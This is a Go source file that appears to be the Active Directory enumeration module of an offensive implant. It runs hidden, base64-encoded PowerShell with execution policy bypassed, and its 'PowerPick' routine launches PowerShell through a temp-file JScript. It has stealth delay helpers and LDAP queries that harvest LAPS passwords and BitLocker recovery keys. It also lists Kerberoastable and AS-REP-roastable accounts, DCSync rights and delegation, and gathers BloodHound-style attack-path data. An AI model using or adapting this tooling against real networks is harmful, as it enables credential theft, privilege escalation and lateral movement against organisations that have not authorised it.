package enum

import (
	"database/sql"
	"encoding/hex"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
	"bytes"
	"syscall"
	"encoding/base64"
	"encoding/binary"
	"golang.org/x/text/encoding/unicode"
        "golang.org/x/text/transform"
	"github.com/shirou/gopsutil/disk"

	"github.com/go-ldap/ldap/v3"
	_ "github.com/denisenkom/go-mssqldb"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/sys/windows"
)



func decodeOutput(b []byte) string {
    decoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
    decoded, _, _ := transform.String(decoder, string(b))
    
    decoded = strings.ReplaceAll(decoded, "\x00", "")
    decoded = strings.TrimSpace(decoded)
    
    return decoded
}

func Pwsh(command string, inParent bool) (string, error) {
    var output bytes.Buffer

    fullCommand := fmt.Sprintf(
        "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; "+
            "$ErrorActionPreference = 'SilentlyContinue'; "+
            "$ProgressPreference = 'SilentlyContinue'; "+
            "(%s) *>&1 | Out-String",
        command,
    )

    utf16leEncoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder()
    utf16Cmd, _, err := transform.String(utf16leEncoder, fullCommand)
    if err != nil {
        return "", fmt.Errorf("UTF-16 encoding failed: %w", err)
    }

    encodedCmd := base64.StdEncoding.EncodeToString([]byte(utf16Cmd))

    cmd := exec.Command("powershell.exe",
        "-NoLogo", "-NonInteractive", "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-EncodedCommand", encodedCmd,
    )

    // Ensure SysProcAttr is always initialized to avoid nil pointer
    cmd.SysProcAttr = &syscall.SysProcAttr{
        HideWindow: !inParent, // Hide window only if inParent is false
    }

    cmd.Stdout = &output
    cmd.Stderr = &output

    if err := cmd.Run(); err != nil {
        return "", fmt.Errorf("PowerShell execution failed: %w", err)
    }

    cleanedOutput := strings.TrimSpace(output.String())
    return cleanedOutput, nil
}


// fullDomainRecon aggregates several enumeration functions into a single report.
func FullDomainRecon() string {
	var report strings.Builder

	report.WriteString("[!] Active Directory Security Assessment\n")
	report.WriteString(fmt.Sprintf("Domain Functional Level: %s\n", GetADFunctionalLevel()))

	report.WriteString("\n[!] Privilege Escalation Vectors\n")
	report.WriteString("Kerberoastable Users:\n")
	for _, user := range EnumKerberoastableUsers() {
		report.WriteString(fmt.Sprintf(" - %s\n", user))
	}

	report.WriteString("\n[!] Lateral Movement Opportunities\n")
	report.WriteString(fmt.Sprintf("Print Spooler Running: %t\n", CheckPrintSpoolerVulnerable()))

	report.WriteString("\n[!] Credential Exposure Points\n")
	if laps := GetLAPSPasswords(); len(laps) > 0 {
		report.WriteString("LAPS Passwords Found!\n")
	}

	return report.String()
}

// 4. GPO Enforcement Check
func CheckEnforcedGPOs() []string {
	return searchLDAP(
		"(gPCUserExtensionNames=*)",
		[]string{"displayName", "gPCFileSysPath", "gPCMachineExtensionNames"},
	)
}

// 5. Kerberoastable Accounts
func EnumKerberoastableUsers() []string {
	return searchLDAP(
		"(&(objectCategory=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
		[]string{"sAMAccountName", "servicePrincipalName", "lastLogon"},
	)
}

// 6. AS-REP Roastable Accounts
func EnumASREPRoastableUsers() []string {
	return searchLDAP(
		"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
		[]string{"sAMAccountName", "userPrincipalName", "lastLogon"},
	)
}

// 7. AdminSDHolder Check  
// Changed return type from string to []string.
func CheckAdminSDHolder() []string {
	return searchLDAP(
		"(objectClass=adminSDHolder)",
		[]string{"distinguishedName", "whenChanged"},
	)
}

// 8. Protected Users Analysis
func CheckProtectedUsers() []string {
	return GetGroupMembers("Protected Users")
}

// 9. MSSQL Instances via SPN
func EnumMSSQLInstances() []string {
	return searchLDAP(
		"(servicePrincipalName=MSSQLSvc/*)",
		[]string{"sAMAccountName", "servicePrincipalName"},
	)
}

// 10. Domain Controller Sync Rights
func CheckDCSyncRights() []string {
	return searchLDAP(
		"(objectClass=domainDNS)",
		[]string{"distinguishedName", "nTSecurityDescriptor"},
	)
}

// 11. ADCS Enrollment Rights
func CheckADCSEnrollmentRights() []string {
	return searchLDAP(
		"(objectClass=pKIEnrollmentService)",
		[]string{"dNSHostName", "certificateTemplates"},
	)
}

// 12. LAPS Audit
func CheckLAPSAuditing() bool {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Policies\Microsoft Services\AdmPwd\Audit`, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	k.Close()
	return true
}

// 13. AD Replication Status
func CheckReplicationStatus() string {
	cmd := exec.Command("repadmin", "/showrepl")
	out, _ := cmd.CombinedOutput()
	return string(out)
}

// 14. DNS Zone Enumeration
func EnumDNSZones() []string {
	return searchLDAP(
		"(objectClass=dnsZone)",
		[]string{"dc", "dnsRecord"},
	)
}

// 15. ADCS Template Enumeration
func EnumADCSTemplates() []string {
	return searchLDAP(
		"(objectClass=pKICertificateTemplate)",
		[]string{"displayName", "msPKI-Certificate-Name-Flag", "msPKI-Enrollment-Flag"},
	)
}

// 16. BitLocker Recovery Keys
func EnumBitLockerRecoveryKeys() []string {
	return searchLDAP(
		"(objectClass=msFVE-RecoveryInformation)",
		[]string{"msFVE-RecoveryPassword", "msFVE-VolumeGuid"},
	)
}

// 17. AD FS Configuration
func EnumADFSConfiguration() []string {
	return searchLDAP(
		"(objectClass=adfsConfiguration)",
		[]string{"adfsServiceCertificate", "adfsSigningCertificate"},
	)
}

// 18. GMSA Account Analysis
func EnumGMSAAccounts() []string {
	return searchLDAP(
		"(objectClass=msDS-GroupManagedServiceAccount)",
		[]string{"sAMAccountName", "msDS-GroupMSAMembership"},
	)
}

// 19. AD Object Metadata  
// Changed to return a single string by joining the slice.
func CheckObjectMetadata(dn string) string {
	entries := searchLDAP(
		fmt.Sprintf("(distinguishedName=%s)", dn),
		[]string{"whenCreated", "whenChanged", "uSNCreated", "uSNChanged"},
	)
	return strings.Join(entries, "\n")
}

// 20. Constrained Language Mode Check
func CheckConstrainedLanguage() bool {
	cmd := exec.Command("powershell", "$ExecutionContext.SessionState.LanguageMode")
	out, _ := cmd.CombinedOutput()
	return strings.Contains(string(out), "ConstrainedLanguage")
}

// Stealth Helpers

func RandomDelay() {
	// Ensure proper multiplication by grouping the addition.
	time.Sleep(time.Duration(rand.Intn(1500)+500) * time.Millisecond)
}

func CleanLDAPQuery(query string) string {
	return strings.ReplaceAll(query, "=", "\\3d")
}

// Advanced Security Descriptor Decoder
func ParseSecurityDescriptor(sd []byte) string {
	// Implement proper SDDL parsing here if needed.
	return hex.EncodeToString(sd)
}

// BloodHound-like Data Collection
func CollectBloodHoundData() map[string]interface{} {
	return map[string]interface{}{
		"users":      EnumDomainUsers(),
		"groups":     EnumPrivilegedGroups(),
		"computers":  EnumDomainComputers(),
		"trusts":     EnumDomainTrusts(),
		"gpos":       EnumGPOs(),
		"sessions":   EnumUserSessions(),
		"acls":       CheckUserControlledACLs(),
		"delegation": CheckKerberosDelegation(),
		"laps":       GetLAPSPasswords(),
		"adcs":       EnumADCSTemplates(),
	}
}

// SQL Server Link Crawler
func CrawlSQLServerLinks(instance string) []string {
	connStr := fmt.Sprintf("server=%s;user id=%s;password=%s;database=master",
		instance, os.Getenv("USERNAME"), "password")

	db, _ := sql.Open("sqlserver", connStr)
	defer db.Close()

	rows, _ := db.Query("EXEC sp_linkedservers")
	defer rows.Close()

	var servers []string
	for rows.Next() {
		var srv string
		rows.Scan(&srv)
		servers = append(servers, srv)
	}
	return servers
}

// AD Recycle Bin Check  
func CheckADRecycleBin() bool {
	entries := searchLDAP(
		"(msDS-EnabledFeature=Recycle Bin Feature)",
		[]string{"distinguishedName"},
	)
	return len(entries) > 0
}

// AD Functional Level Check
func GetADFunctionalLevel() string {
	conn := GetLDAPConnection()
	defer conn.Close()

	searchRequest := ldap.NewSearchRequest(
		GetDomainDN(),
		ldap.ScopeBaseObject, 0, 0, 0, false,
		"(objectClass=*)",
		[]string{"domainFunctionality"},
		nil,
	)

	result, _ := conn.Search(searchRequest)
	if len(result.Entries) > 0 {
		return result.Entries[0].GetAttributeValue("domainFunctionality")
	}
	return "unknown"
}

// PrintNightmare Check
func CheckPrintSpoolerVulnerable() bool {
	cmd := exec.Command("powershell", "Get-Service -Name Spooler | Select-Object -ExpandProperty Status")
	out, _ := cmd.CombinedOutput()
	return strings.Contains(string(out), "Running")
}

// Session Enumeration  
// Changed return type from map[string][]string to []string to match searchLDAP().
func EnumUserSessions() []string {
	return searchLDAP(
		"(objectCategory=computer)",
		[]string{"dNSHostName", "lastLogonTimestamp", "operatingSystem"},
	)
}

// Local Admin Access Check
func CheckLocalAdminAccess(computer string) bool {
	cmd := exec.Command("net", "localgroup", "Administrators")
	out, _ := cmd.CombinedOutput()
	return strings.Contains(string(out), os.Getenv("USERNAME"))
}

// ACL Analysis
func CheckUserControlledACLs() []string {
	return searchLDAP(
		"(nTSecurityDescriptor=*)",
		[]string{"distinguishedName", "nTSecurityDescriptor"},
	)
}

// Get current domain information
func GetDomainInfo() string {
	conn := GetLDAPConnection()
	defer conn.Close()

	searchRequest := ldap.NewSearchRequest(
		"", // Base DN
		ldap.ScopeBaseObject, ldap.NeverDerefAliases, 0, 0, false,
		"(objectClass=*)",
		[]string{"defaultNamingContext", "dnsHostName", "domainControllerFunctionality"},
		nil,
	)

	result, _ := conn.Search(searchRequest)
	if len(result.Entries) == 0 {
		return ""
	}

	entry := result.Entries[0]
	return fmt.Sprintf(
		"Domain: %s\nDNS Name: %s\nDC Functionality: %s",
		entry.GetAttributeValue("defaultNamingContext"),
		entry.GetAttributeValue("dnsHostName"),
		entry.GetAttributeValue("domainControllerFunctionality"),
	)
}

// Enumerate privileged users
func EnumDomainAdmins() []string {
	return GetGroupMembers("Domain Admins")
}

// Enumerate all domain users
func EnumDomainUsers() []string {
	return searchLDAP(
		"(objectCategory=user)",
		[]string{"sAMAccountName", "userPrincipalName", "lastLogon"},
	)
}

// Enumerate domain computers
func EnumDomainComputers() []string {
	return searchLDAP(
		"(objectCategory=computer)",
		[]string{"dNSHostName", "operatingSystem", "lastLogonTimestamp"},
	)
}

// Enumerate sensitive groups
func EnumPrivilegedGroups() map[string][]string {
	groups := map[string][]string{
		"Enterprise Admins":  GetGroupMembers("Enterprise Admins"),
		"Schema Admins":      GetGroupMembers("Schema Admins"),
		"Account Operators":  GetGroupMembers("Account Operators"),
		"Backup Operators":   GetGroupMembers("Backup Operators"),
		"Domain Controllers": GetGroupMembers("Domain Controllers"),
		"Read-only DCs":      GetGroupMembers("Read-only Domain Controllers"),
	}
	return groups
}

// Check if current user has admin privileges
func IsDomainAdmin() bool {
	currentUser, _ := user.Current()
	return contains(GetGroupMembers("Domain Admins"), currentUser.Username)
}

// Helper function to check if a slice contains a string.
func contains(slice []string, str string) bool {
	for _, s := range slice {
		if s == str {
			return true
		}
	}
	return false
}

// Get password policy information
func GetPasswordPolicy() string {
	conn := GetLDAPConnection()
	defer conn.Close()

	searchRequest := ldap.NewSearchRequest(
		"CN=Password Settings Container,CN=System,"+GetDomainDN(),
		ldap.ScopeWholeSubtree, ldap.NeverDerefAliases, 0, 0, false,
		"(objectClass=msDS-PasswordSettings)",
		[]string{"msDS-MinimumPasswordLength", "msDS-PasswordHistoryLength",
			"msDS-LockoutThreshold", "msDS-LockoutDuration"},
		nil,
	)

	result, _ := conn.Search(searchRequest)
	if len(result.Entries) == 0 {
		return "No password policy found"
	}

	entry := result.Entries[0]
	return fmt.Sprintf(
		"Password Policy:\nMin Length: %s\nHistory Length: %s\nLockout Threshold: %s\nLockout Duration: %s",
		entry.GetAttributeValue("msDS-MinimumPasswordLength"),
		entry.GetAttributeValue("msDS-PasswordHistoryLength"),
		entry.GetAttributeValue("msDS-LockoutThreshold"),
		entry.GetAttributeValue("msDS-LockoutDuration"),
	)
}


// encoded command

func encodeCommand(command string) (string, error) {
	// Convert the command string to UTF-16 code units.
	utf16Chars := windows.StringToUTF16(command)
	// Write the UTF-16 code units as bytes in little-endian format.
	var buf bytes.Buffer
	for _, char := range utf16Chars {
		err := binary.Write(&buf, binary.LittleEndian, char)
		if err != nil {
			return "", fmt.Errorf("error writing UTF-16 bytes: %v", err)
		}
	}
	encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
	return encoded, nil
}

func PowerPick(command string) (string, error) {
    var output bytes.Buffer
    
    jscriptTemplate := `
        try {
            var ps = WScript.CreateObject("System.Management.Automation.PowerShell");
            ps.AddScript(%q);
            var results = ps.Invoke();
            
            if (ps.Streams.Error.Count > 0) {
                WScript.StdErr.WriteLine("PowerShell Errors:");
                for (var e = new Enumerator(ps.Streams.Error); !e.atEnd(); e.moveNext()) {
                    WScript.StdErr.WriteLine(e.item().ToString());
                }
            }
            
            for (var r = new Enumerator(results); !r.atEnd(); r.moveNext()) {
                WScript.StdOut.WriteLine(r.item().ToString());
            }
        } catch (e) {
            WScript.StdErr.WriteLine("Critical Error: " + e.message);
            WScript.Quit(1);
        }
    `

    jscriptContent := fmt.Sprintf(jscriptTemplate, command)

    utf16le := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM)
    encoder := utf16le.NewEncoder()
    jscriptEncoded, _, err := transform.String(encoder, jscriptContent)
    if err != nil {
        return "", fmt.Errorf("UTF-16 encoding failed: %w", err)
    }

    tmpFile, err := os.CreateTemp("", "script-*.js")
    if err != nil {
        return "", fmt.Errorf("temp file creation failed: %w", err)
    }
    defer os.Remove(tmpFile.Name())
    
    tmpFile.Write([]byte{0xFF, 0xFE}) 
    if _, err := tmpFile.WriteString(jscriptEncoded); err != nil {
        return "", fmt.Errorf("temp file write failed: %w", err)
    }
    tmpFile.Close()

    cmd := exec.Command("cscript.exe", 
        "//Nologo", 
        "//E:JScript", 
        tmpFile.Name(),
    )

    cmd.Stdout = &output
    cmd.Stderr = &output

    if err := cmd.Run(); err != nil {
        return "", fmt.Errorf("cscript execution failed: %w (output: %s)", 
            err, output.String())
    }

    return strings.TrimSpace(output.String()), nil
}

func EnumDomainTrusts() []string {
	conn := GetLDAPConnection()
	defer conn.Close()

	searchRequest := ldap.NewSearchRequest(
		GetDomainDN(),
		ldap.ScopeBaseObject, ldap.NeverDerefAliases, 0, 0, false,
		"(objectClass=domainDNS)",
		[]string{"trustedDomain", "trustDirection", "trustType", "trustAttributes"},
		nil,
	)

	result, _ := conn.Search(searchRequest)
	var trusts []string
	for _, entry := range result.Entries {
		trusts = append(trusts, fmt.Sprintf(
			"Trust: %s\nDirection: %s\nType: %s\nAttributes: %s",
			entry.GetAttributeValue("trustedDomain"),
			entry.GetAttributeValue("trustDirection"),
			entry.GetAttributeValue("trustType"),
			entry.GetAttributeValue("trustAttributes"),
		))
	}
	return trusts
}

// Enumerate GPOs
func EnumGPOs() []string {
	return searchLDAP(
		"(objectCategory=groupPolicyContainer)",
		[]string{"displayName", "gPCFileSysPath", "versionNumber"},
	)
}

// Find users with SPN (potential service accounts)
func EnumSPNUsers() []string {
	return searchLDAP(
		"(&(objectCategory=user)(servicePrincipalName=*))",
		[]string{"sAMAccountName", "servicePrincipalName"},
	)
}

// Helper functions

func GetLDAPConnection() *ldap.Conn {
	conn, _ := ldap.Dial("tcp", fmt.Sprintf("%s:389", GetDomainController()))
	// For anonymous bind – add credentials if needed.
	conn.Bind("", "")
	return conn
}

func GetDomainDN() string {
	conn := GetLDAPConnection()
	defer conn.Close()

	searchRequest := ldap.NewSearchRequest(
		"",
		ldap.ScopeBaseObject, 0, 0, 0, false,
		"(objectClass=*)", []string{"defaultNamingContext"}, nil,
	)
	result, _ := conn.Search(searchRequest)
	if len(result.Entries) > 0 {
		return result.Entries[0].GetAttributeValue("defaultNamingContext")
	}
	return ""
}

func searchLDAP(filter string, attrs []string) []string {
	conn := GetLDAPConnection()
	defer conn.Close()

	searchRequest := ldap.NewSearchRequest(
		GetDomainDN(),
		ldap.ScopeWholeSubtree, 0, 0, 0, false,
		filter,
		attrs,
		nil,
	)

	result, _ := conn.Search(searchRequest)
	var entries []string
	for _, entry := range result.Entries {
		var values []string
		for _, attr := range attrs {
			values = append(values, fmt.Sprintf("%s: %s", attr, entry.GetAttributeValue(attr)))
		}
		entries = append(entries, strings.Join(values, "\n"))
	}
	return entries
}

func GetGroupMembers(groupName string) []string {
	conn := GetLDAPConnection()
	defer conn.Close()

	searchRequest := ldap.NewSearchRequest(
		fmt.Sprintf("CN=%s,CN=Users,%s", groupName, GetDomainDN()),
		ldap.ScopeWholeSubtree, 0, 0, 0, false,
		"(member=*)",
		[]string{"member"},
		nil,
	)

	result, _ := conn.Search(searchRequest)
	if len(result.Entries) == 0 {
		return nil
	}

	return result.Entries[0].GetAttributeValues("member")
}

func GetDomainController() string {
	cmd := exec.Command("cmd", "/c", "nltest /dsgetdc:")
	out, _ := cmd.CombinedOutput()
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if strings.Contains(line, "DC:") {
			parts := strings.Split(line, "\\\\")
			if len(parts) > 1 {
				return strings.TrimSpace(parts[1])
			}
		}
	}
	return ""
}

// Advanced Checks

func CheckKerberosDelegation() []string {
	return searchLDAP(
		"(|(msDS-AllowedToDelegateTo=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))",
		[]string{"sAMAccountName", "msDS-AllowedToDelegateTo"},
	)
}

func CheckUnconstrainedDelegation() []string {
	return searchLDAP(
		"(userAccountControl:1.2.840.113556.1.4.803:=524288)",
		[]string{"sAMAccountName", "dNSHostName"},
	)
}

func CheckLAPSInstalled() bool {
	_, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Policies\Microsoft Services\AdmPwd`, registry.QUERY_VALUE)
	return err == nil
}

func GetLAPSPasswords() []string {
	return searchLDAP(
		"(ms-Mcs-AdmPwd=*)",
		[]string{"ms-Mcs-AdmPwd", "dNSHostName"},
	)
}

// EnumPasswordNeverExpires returns user accounts whose passwords are set to never expire.
// In Active Directory, the flag for "password never expires" is 0x10000 (decimal 65536).
func EnumPasswordNeverExpires() []string {
	filter := "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))"
	attrs := []string{"sAMAccountName", "userPrincipalName", "lastLogon"}
	return searchLDAP(filter, attrs)
}

// EnumDisabledAccounts returns user accounts that are disabled.
// The flag for a disabled account is 0x2.
func EnumDisabledAccounts() []string {
	filter := "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
	attrs := []string{"sAMAccountName", "userPrincipalName", "lastLogon"}
	return searchLDAP(filter, attrs)
}

// EnumLockedOutAccounts returns user accounts that are currently locked out.
// The attribute "lockoutTime" is non-zero when an account is locked.
func EnumLockedOutAccounts() []string {
	filter := "(&(objectCategory=user)(lockoutTime>=1))"
	attrs := []string{"sAMAccountName", "lockoutTime"}
	return searchLDAP(filter, attrs)
}

func EnumStaleComputerAccounts(days int) []string {
	// Calculate the threshold in Unix time
	thresholdUnix := time.Now().AddDate(0, 0, -days).Unix()
	// Convert Unix time to Windows FILETIME:
	// Windows FILETIME = (Unix time + 11644473600) * 10^7
	thresholdFiletime := (thresholdUnix + 11644473600) * 10000000
	filter := fmt.Sprintf("(&(objectCategory=computer)(lastLogonTimestamp<=%d))", thresholdFiletime)
	attrs := []string{"dNSHostName", "lastLogonTimestamp"}
	return searchLDAP(filter, attrs)
}

// EnumInactiveUserAccounts returns user accounts that have not logged on within the past 'days' days.
// Like computers, user "lastLogonTimestamp" is stored as a Windows FILETIME.
func EnumInactiveUserAccounts(days int) []string {
	thresholdUnix := time.Now().AddDate(0, 0, -days).Unix()
	thresholdFiletime := (thresholdUnix + 11644473600) * 10000000
	filter := fmt.Sprintf("(&(objectCategory=user)(lastLogonTimestamp<=%d))", thresholdFiletime)
	attrs := []string{"sAMAccountName", "lastLogonTimestamp"}
	return searchLDAP(filter, attrs)
}

// EnumADOrganizationalUnits returns all organizational units in the domain.
func EnumADOrganizationalUnits() []string {
	filter := "(objectClass=organizationalUnit)"
	attrs := []string{"distinguishedName", "ou"}
	return searchLDAP(filter, attrs)
}

// EnumADSites returns all AD Sites.
// Note: The actual LDAP filter for sites may vary based on your environment.
func EnumADSites() []string {
	filter := "(objectClass=site)"
	attrs := []string{"cn", "description"}
	return searchLDAP(filter, attrs)
}

func EnumADSubnets() []string {
	filter := "(objectClass=subnet)"
	attrs := []string{"cn", "description", "location"}
	return searchLDAP(filter, attrs)
}

func GetDrives() (string, error) {
    partitions, err := disk.Partitions(true)
    if err != nil {
        return "", err
    }

    var sb strings.Builder
    sb.WriteString("[+] Drive List:\n")
    for _, p := range partitions {
        sb.WriteString(fmt.Sprintf("    Device     : %s\n", p.Device))
        sb.WriteString(fmt.Sprintf("    Mountpoint : %s\n", p.Mountpoint))
        sb.WriteString(fmt.Sprintf("    Type       : %s\n", p.Fstype))
        sb.WriteString(fmt.Sprintf("    Options    : %s\n\n", p.Opts))
    }

    return sb.String(), nil
}



